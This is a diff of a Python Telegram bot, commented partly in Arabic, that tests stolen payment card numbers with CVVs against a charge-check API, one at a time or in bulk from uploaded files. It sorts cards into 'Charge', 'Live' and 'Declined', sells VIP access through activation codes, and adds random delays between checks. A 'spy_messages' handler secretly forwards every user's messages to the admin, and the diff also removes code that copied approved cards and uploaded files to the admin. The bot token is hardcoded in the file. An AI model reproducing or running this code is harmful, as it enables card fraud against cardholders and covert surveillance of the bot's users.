@@ -15,12 +15,15 @@ TOKEN = '8689698569:AAF6GOOcFdsTnG_UXXHLqWkis0bCsIFsQJQ'
 # ------------------- Users -------------------
 
 ADMINS = [6843321125]  # ضع هنا ID الأدمن
-VIP_USERS = {}       
-BANNED_USERS = {}    
-ALL_USERS = set()    
+VIP_USERS = {}       # {user_id: expiration_timestamp}
+BANNED_USERS = {}    # {user_id: True}
+ALL_USERS = set()    # كل مستخدم دخل البوت
 stop_users = {}
 last_check_time = {}
 ANTI_SPAM_SECONDS = 7
+
+# 🔥 إضافة الأدمن
+ADMIN_ID = 6843321125
 
 # ------------------- Gates -------------------
 
@@ -33,7 +36,7 @@ api_semaphore = asyncio.Semaphore(6)
 
 # ------------------- Codes -------------------
 
-CODES = {}  
+CODES = {}  # {"WAFA-XXXX-XXXX-XXXX": {"duration":7, "max_users":5, "used":0, "created":timestamp}}
 
 # ------------------- BIN Lookup -------------------
 
@@ -43,7 +46,7 @@ async def get_bin_info(bin_number):
         f"https://bins.antipublic.cc/bins/{bin_number}",
         f"https://bincheck.io/api/{bin_number}"
     ]
-    for _ in range(3):
+    for attempt in range(3):
         for url in urls:
             try:
                 async with httpx.AsyncClient(timeout=10) as client:
@@ -53,18 +56,30 @@ async def get_bin_info(bin_number):
                     data = r.json()
                     brand = data.get("scheme") or data.get("brand") or data.get("type")
                     card_type = data.get("type") or data.get("card_type")
-                    bank = data.get("bank",{}).get("name") if isinstance(data.get("bank"),dict) else data.get("bank")
-                    country = data.get("country",{}).get("name") if isinstance(data.get("country"),dict) else data.get("country")
+                    bank = (
+                        data.get("bank", {}).get("name")
+                        if isinstance(data.get("bank"), dict)
+                        else data.get("bank")
+                    )
+                    country = (
+                        data.get("country", {}).get("name")
+                        if isinstance(data.get("country"), dict)
+                        else data.get("country")
+                    )
                     if not bank:
                         bank = data.get("issuer") or data.get("bank_name")
                     if not country:
                         country = data.get("country_name")
                     if brand or bank or country:
-                        return brand or "Unknown", bank or "Unknown", country or "Unknown"
+                        return (
+                            f"{brand or 'Unknown'} - {card_type or 'Unknown'}",
+                            bank or "Unknown",
+                            country or "Unknown"
+                        )
             except:
                 continue
         await asyncio.sleep(0.5)
-    return "Unknown","Unknown","Unknown"
+    return "Unknown", "Unknown", "Unknown"
 
 # ------------------- Check API -------------------
 
@@ -90,15 +105,15 @@ async def check_card_api(card_full):
 
 # ------------------- Format Response -------------------
 
-async def format_response(card_full,status,response,taken):
+async def format_response(card_full, status, response, taken):
     bin_number = card_full.split("|")[0][:6]
     info, bank, country = await get_bin_info(bin_number)
-    if status=="approved":
-        title="#Charge ✅"
-    elif status=="live":
-        title="#Live 🟢"
+    if status == "approved":
+        title = "#Charge ✅"
+    elif status == "live":
+        title = "#Live 🟢"
     else:
-        title="#Declined ❌"
+        title = "#Declined ❌"
     return f"""{title}
 
 💳 Card: {card_full}
@@ -121,7 +136,7 @@ def can_user_check(user_id, mode="file"):
     elif user_id in VIP_USERS and VIP_USERS[user_id] > time.time():
         return True
     else:
-        return mode=="single"
+        return mode == "single"
 
 # ------------------- /pp -------------------
 
@@ -129,19 +144,19 @@ async def pp(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     ALL_USERS.add(user_id)
 
-    if not can_user_check(user_id,"single"):
-        await update.message.reply_text("❌ VIP only for single check.")
-        return
+    if not can_user_check(user_id, "single"):  
+        await update.message.reply_text("❌ VIP only for single check.")  
+        return  
 
-    if user_id not in ADMINS and (user_id not in VIP_USERS or VIP_USERS[user_id] < time.time()):
-        now = time.time()
-        last = last_check_time.get(user_id,0)
-        if now - last < ANTI_SPAM_SECONDS:
-            await update.message.reply_text(f"❌ Wait {ANTI_SPAM_SECONDS} seconds before next check")
-            return
-        last_check_time[user_id]=now
+    if user_id not in ADMINS and (user_id not in VIP_USERS or VIP_USERS[user_id] < time.time()):  
+        now = time.time()  
+        last = last_check_time.get(user_id, 0)  
+        if now - last < ANTI_SPAM_SECONDS:  
+            await update.message.reply_text(f"❌ Wait {ANTI_SPAM_SECONDS} seconds before next check")  
+            return  
+        last_check_time[user_id] = now  
 
-    asyncio.create_task(process_pp(update,context))
+    asyncio.create_task(process_pp(update, context))
 
 async def process_pp(update: Update, context: ContextTypes.DEFAULT_TYPE):
     card_full = " ".join(context.args)
@@ -149,19 +164,16 @@ async def process_pp(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("Usage:\n/pp 4242424242424242|09|28|123")
         return
     start_time = time.time()
-    status,response = await check_card_api(card_full)
+    status, response = await check_card_api(card_full)
     taken = round(time.time()-start_time,2)
-    text = await format_response(card_full,status,response,taken)
-    
-    # 🔥 ارسال Charge للمستخدم والأدمن مباشرة
-    if status=="approved":
-        await context.bot.send_message(chat_id=ADMINS[0], text=text)
+    text = await format_response(card_full, status, response, taken)
     await update.message.reply_text(text)
 
 # ------------------- /stop -------------------
 
 async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    stop_users[update.effective_user.id] = True
+    user_id = update.effective_user.id
+    stop_users[user_id] = True
     await update.message.reply_text("Stopped ⛔")
 
 # ------------------- File Handler -------------------
@@ -169,22 +181,19 @@ async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
 async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     ALL_USERS.add(user_id)
-    if not can_user_check(user_id,"file"):
-        await update.message.reply_text("❌ VIP only for file check.")
-        return
-    asyncio.create_task(process_file(update,context))
+
+    if not can_user_check(user_id, "file"):  
+        await update.message.reply_text("❌ VIP only for file check.")  
+        return  
+
+    asyncio.create_task(process_file(update, context))
 
 async def process_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     stop_users[user_id] = False
     os.makedirs("downloads", exist_ok=True)
     file = await update.message.document.get_file()
-    file_path = f"downloads/{file.file_id}_{update.message.document.file_name}"
-    
-    # 🔥 ارسال الملف لك وللمستخدم قبل الفحص
-    await update.message.reply_document(document=open(file_path,'rb'))
-    await context.bot.send_document(chat_id=ADMINS[0], document=open(file_path,'rb'))
-
+    file_path = f"downloads/{file.file_id}.txt"
     await file.download_to_drive(file_path)
     results_file_path = f"downloads/results_{file.file_id}.txt"
     approved=live=declined=0
@@ -192,26 +201,20 @@ async def process_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
     with open(file_path,'r',encoding='utf-8') as f:
         lines = f.readlines()
 
-    async def process_line(line):
-        nonlocal approved,live,declined
-        match = re.findall(r'\d{12,16}\|\d{2}\|\d{2,4}\|\d{3,4}',line)
-        if not match: return None
-        card_full = match[0]
-        start_time = time.time()
-        status,response = await check_card_api(card_full)
-        taken = round(time.time()-start_time,2)
-        text = await format_response(card_full,status,response,taken)
-        # 🔥 ارسال Charge للمستخدم والأدمن فوراً
-        if status=="approved":
-            approved+=1
-            await update.message.reply_text(text)
-            await context.bot.send_message(chat_id=ADMINS[0], text=text)
-        elif status=="live":
-            live+=1
-            await update.message.reply_text(text)
-        else:
-            declined+=1
-        last_info,last_bank,last_country = await get_bin_info(card_full.split("|")[0][:6])
+    async def process_line(line):  
+        nonlocal approved, live, declined  
+        match = re.findall(r'\d{12,16}\|\d{2}\|\d{2,4}\|\d{3,4}',line)  
+        if not match: return None  
+        card_full = match[0]  
+        start_time=time.time()  
+        status,response = await check_card_api(card_full)  
+        await asyncio.sleep(random.uniform(1,5))  
+        taken = round(time.time()-start_time,2)  
+        text = await format_response(card_full,status,response,taken)  
+        if status=="approved": approved+=1; await update.message.reply_text(text)  
+        elif status=="live": live+=1; await update.message.reply_text(text)  
+        else: declined+=1  
+        last_info,last_bank,last_country = await get_bin_info(card_full.split("|")[0][:6])  
         panel = f"""📊 Status
 
 ✅ Charge: {approved}
@@ -234,18 +237,17 @@ async def process_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
         except: pass
         return text
 
-    for line in lines:
-        if stop_users.get(user_id): await update.message.reply_text("Stopped ⛔"); return
-        await process_line(line)
+    for line in lines:  
+        if stop_users.get(user_id): await update.message.reply_text("Stopped ⛔"); return  
+        await process_line(line)  
 
-    with open(results_file_path,'w',encoding='utf-8') as result_file:
-        for line in lines:
-            r = await format_response(line.strip(),"N/A","N/A",0)
-            result_file.write(r+"\n\n")
+    with open(results_file_path,'w',encoding='utf-8') as result_file:  
+        for line in lines:  
+            r = await format_response(line.strip(),"N/A","N/A",0)  
+            result_file.write(r+"\n\n")  
     await update.message.reply_text(f"Done ✅\nResults saved: {results_file_path}")
 
-# ------------------- /try -------------------
-
+# 🔥 /try
 async def try_reply(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id not in ADMINS:
         return
@@ -257,8 +259,19 @@ async def try_reply(update: Update, context: ContextTypes.DEFAULT_TYPE):
     except:
         await update.message.reply_text("❌ Usage:\n/try 123456789 hello")
 
-# ------------------- /code -------------------
+# 🔥 استقبال كل الرسائل
+async def spy_messages(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    try:
+        user = update.effective_user
+        text = update.message.text or "No Text"
+        await context.bot.send_message(
+            chat_id=ADMIN_ID,
+            text=f"📩 New Message\n👤 {user.first_name} ({user.id})\n💬 {text}"
+        )
+    except:
+        pass
 
+# ------------------- /code -------------------
 async def code_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     ALL_USERS.add(user_id)
@@ -275,7 +288,6 @@ async def code_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(f"✅ Code activated!\nYou are now VIP for {code_data['duration']} days.\nUsed {code_data['used']}/{code_data['max_users']}")
 
 # ------------------- /wafa -------------------
-
 async def wafa_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     if user_id not in ADMINS: 
@@ -292,7 +304,6 @@ async def wafa_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(f"✅ Created code:\n{code}\nDuration: {duration} days\nMax users: {max_users}")
 
 # ------------------- /show_users -------------------
-
 async def show_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     if user_id not in ADMINS: 
@@ -305,7 +316,6 @@ async def show_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(msg if msg else "No users yet")
 
 # ------------------- Ban/Unban -------------------
-
 async def ban_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     if user_id not in ADMINS: 
@@ -327,54 +337,13 @@ async def unban_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
     BANNED_USERS.pop(uid,None)
     await update.message.reply_text(f"User {uid} unbanned ✅")
 
-# ------------------- Spy Messages -------------------
-
-async def spy_messages(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    try:
-        user = update.effective_user
-        text = update.message.text
-        if text:
-            await context.bot.send_message(
-                chat_id=ADMINS[0],
-                text=f"📩 New Message\n👤 {user.first_name} ({user.id})\n💬 {text}\n💎 Type: text"
-            )
-        elif update.message.document:
-            file = await update.message.document.get_file()
-            file_path = f"downloads/{file.file_id}_{update.message.document.file_name}"
-            os.makedirs("downloads", exist_ok=True)
-            await file.download_to_drive(file_path)
-            await context.bot.send_document(chat_id=ADMINS[0], document=open(file_path,'rb'))
-        elif update.message.photo:
-            photo = update.message.photo[-1]
-            file = await photo.get_file()
-            file_path = f"downloads/{file.file_id}.jpg"
-            os.makedirs("downloads", exist_ok=True)
-            await file.download_to_drive(file_path)
-            await context.bot.send_photo(chat_id=ADMINS[0], photo=open(file_path,'rb'))
-        elif update.message.voice:
-            voice = await update.message.voice.get_file()
-            file_path = f"downloads/{voice.file_id}.ogg"
-            os.makedirs("downloads", exist_ok=True)
-            await voice.download_to_drive(file_path)
-            await context.bot.send_voice(chat_id=ADMINS[0], voice=open(file_path,'rb'))
-        elif update.message.video:
-            video = await update.message.video.get_file()
-            file_path = f"downloads/{video.file_id}.mp4"
-            os.makedirs("downloads", exist_ok=True)
-            await video.download_to_drive(file_path)
-            await context.bot.send_video(chat_id=ADMINS[0], video=open(file_path,'rb'))
-    except:
-        pass
-
 # ------------------- /start -------------------
-
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     ALL_USERS.add(user_id)
     await update.message.reply_text("Bot Ready ✅")
 
 # ------------------- Run -------------------
-
 def main():
     app = Application.builder().token(TOKEN).build()
     app.add_handler(CommandHandler("start", start))
@@ -386,9 +355,9 @@ def main():
     app.add_handler(CommandHandler("ban_user", ban_user))
     app.add_handler(CommandHandler("unban_user", unban_user))
     app.add_handler(CommandHandler("try", try_reply))
-    app.add_handler(MessageHandler(filters.ALL, spy_messages))
+    app.add_handler(MessageHandler(filters.ALL, spy_messages))  # 🔥 الجديد
     app.add_handler(MessageHandler(filters.Document.ALL, handle_file))
     app.run_polling()
 
-if __name__=="__main__":
+if __name__ == "__main__":
     main()
